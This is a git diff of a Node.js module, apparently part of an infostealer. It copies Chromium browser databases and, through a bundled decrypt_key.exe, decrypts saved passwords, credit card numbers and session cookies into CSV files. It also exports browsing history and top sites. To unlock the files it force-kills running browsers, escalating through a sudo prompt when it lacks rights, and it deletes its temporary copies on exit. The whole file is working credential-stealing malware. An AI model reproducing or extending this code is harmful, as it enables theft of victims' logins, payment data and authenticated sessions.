@@ -1,92 +1,73 @@
-const { existsSync, copyFileSync, mkdirSync, writeFileSync, rmSync } = require('fs');
+const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
 const { join, sep } = require('path');
 const { randomFileCreator } = require('../util/dir');
 const psList = () => import('ps-list').then(({ default: psList }) => psList());
 const sudo = require('sudo-prompt');
+const { execSync } = require('child_process');
 const { tempFolder } = require('../index');
-// const moment = require('moment');
 const { addDoubleQuotes } = require('../util/string');
-const sqlite3 = require('sqlite3').verbose();
 
 const filesToDelete = [];
-const _ = (name, path, use, filename, database, rows, dbData) => {
+const toolPath = addDoubleQuotes(join(__dirname, '..', 'util', 'decrypt-key', 'decrypt_key.exe'));
+const _ = (name, path, use, filename, dbData) => {
   path += join(sep, 'Default', use);
   if (!existsSync(path)) return;
 
   if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
   const file = join(tempFolder, 'Browsers', name, `${filename}.csv`);
-  const data = [];
   const dbFile = randomFileCreator();
   filesToDelete.push(dbFile);
   copyFileSync(path, dbFile);
 
-  const db = new sqlite3.Database(dbFile);
-  data.push(rows);
-  db.serialize(() => {
-    db.each(`SELECT * from ${database}`, (err, row) => {
-      if (err) return;
-      data.push(dbData(row));
-
-      writeFileSync(file, data.join('\n'));
-    });
-  });
-
-  db.close();
+  dbData(dbFile, file);
 };
 
 module.exports.passwords = (name, path) => {
-  return _(name, path, 'Login Data', 'Logins', 'logins', [
-    addDoubleQuotes('origin url'), 'username', 'password', addDoubleQuotes('date created'),
-    addDoubleQuotes('date last used'), addDoubleQuotes('date password modified'),
-  ], (row) => ([
-    addDoubleQuotes(row.origin_url), addDoubleQuotes(row.username_value), row.password_value.toString(), // Buffer
-    /*moment(*/row.date_created/*).toISOString()*/,
-    /*moment(*/row.date_last_used/*).toISOString()*/,
-    /*moment(*/row.date_password_modified/*).toISOString()*/,
-  ]));
+  return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => execSync(
+    [
+      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
+      `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
+    ].join(' ')
+  ));
 };
 
 module.exports.history = (name, path) => {
-  return _(name, path, 'History', 'History', 'urls', [
-    'url', 'title', addDoubleQuotes('visit count'), addDoubleQuotes('typed count'),
-    addDoubleQuotes('last visit time'),
-  ], (row) => ([
-    addDoubleQuotes(row.url), addDoubleQuotes(row.title), row.visit_count,
-    row.typed_count,
-    /*moment(*/row.last_visit_time/*).toISOString()*/,
-  ]));
+  return _(name, path, 'History', 'History', (dbFile, csvFile) => execSync(
+    [
+      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
+      `--csv-file "${csvFile}"`, '--rows "url,title,visit count,typed count"'
+    ].join(' ')
+  ));
 };
 
 module.exports.creditCards = (name, path) => {
-  return _(name, path, 'Web Data', 'Credit Cards', 'credit_cards', [
-    'guid', addDoubleQuotes('name on card'), addDoubleQuotes('expiration date'),
-    addDoubleQuotes('card number encrypted'),
-  ], (row) => ([
-    row.guid, addDoubleQuotes(row.name_on_card),
-    `${row.expiration_month >= 10 ? row.expiration_month : `0${row.expiration_month}`}/${row.expiration_year}`,
-    row.card_number_encrypted?.toString(),
-  ]));
+  return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => execSync(
+    [
+      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
+      '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
+      `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
+    ].join(' ')
+  ));
 };
 
 module.exports.cookies = (name, path) => {
-  return _(name, path, join('Network', 'Cookies'), 'Cookies', 'cookies', [
-    addDoubleQuotes('creation (utc)'), 'host', 'name', 'value', 'path', addDoubleQuotes('expires (utc)'),
-    addDoubleQuotes('is secure'), addDoubleQuotes('is httponly'), addDoubleQuotes('last access (utc)'),
-    addDoubleQuotes('has expires'), addDoubleQuotes('is persistent'), 'samesite', 'port',
-    addDoubleQuotes('last update (utc)')
-  ], (row) => ([
-    row.creation_utc, addDoubleQuotes(row.host_key), addDoubleQuotes(row.name), addDoubleQuotes(row.encrypted_value.toString().replaceAll(/[\n\r]/gm, '\\n')),
-    row.path, row.expires_utc, row.is_secure, row.is_httponly, row.last_access_utc, row.has_expires,
-    row.is_persistent, row.samesite, row.source_port, row.last_update_utc
-  ]));
+  return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => execSync(
+    [
+      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
+      '--sql "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, has_expires, is_persistent, samesite, source_port FROM cookies"',
+      `--csv-file "${csvFile}"`, '--rows "host,name,value,path,is secure,is httponly,has expires,is persistent,samesite,port"',
+      '--decrypt-row 2'
+    ].join(' ')
+  ));
 };
 
 module.exports.topSites = (name, path) => {
-  return _(name, path, 'Top Sites', 'Top Sites', 'top_sites', [
-    'url', addDoubleQuotes('url rank'), 'title'
-  ], (row) => ([                     // https://stackoverflow.com/a/17808731/13088041
-    addDoubleQuotes(row.url), row.url_rank, addDoubleQuotes(row.title.replaceAll('"', '""'))
-  ]));
+  return _(name, path, 'Top Sites', 'Top Sites', (dbFile, csvFile) => execSync(
+    [
+      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, url_rank, title FROM top_sites"',
+      `--csv-file "${csvFile}"`, '--rows "url,url rank,title"'
+    ].join(' ')
+  ));
 };
 
 module.exports.kill = (browser, onKilled) => {
@@ -97,7 +78,12 @@ module.exports.kill = (browser, onKilled) => {
         // If we can't kill the browser without using administrator rights, we
         // need to use these to get access to the browser database files
         if (err.message === 'kill EPERM') {
-          sudo.exec(`taskkill /f /im ${browserProcess?.name}`, {
+          let cmd;
+          // eslint-disable-next-line indent
+               if (process.platform === 'win32') cmd = 'taskkill /f /im';
+          else if (process.platform === 'linux') cmd = 'killall';
+          else cmd = 'kill';
+          sudo.exec(`${cmd} ${browserProcess?.name}`, {
             name: require('../config').name
           }, (err) => {
             if (err) return;
@@ -122,4 +108,9 @@ module.exports.kill = (browser, onKilled) => {
   });
 };
 
-process.on('beforeExit', () => filesToDelete.forEach(file => rmSync(file)));
+process.on('exit', () => {
+  new Promise(r => setTimeout(r, 1000));
+  filesToDelete.forEach(file => {
+    if (existsSync(file)) rmSync(file);
+  });
+});
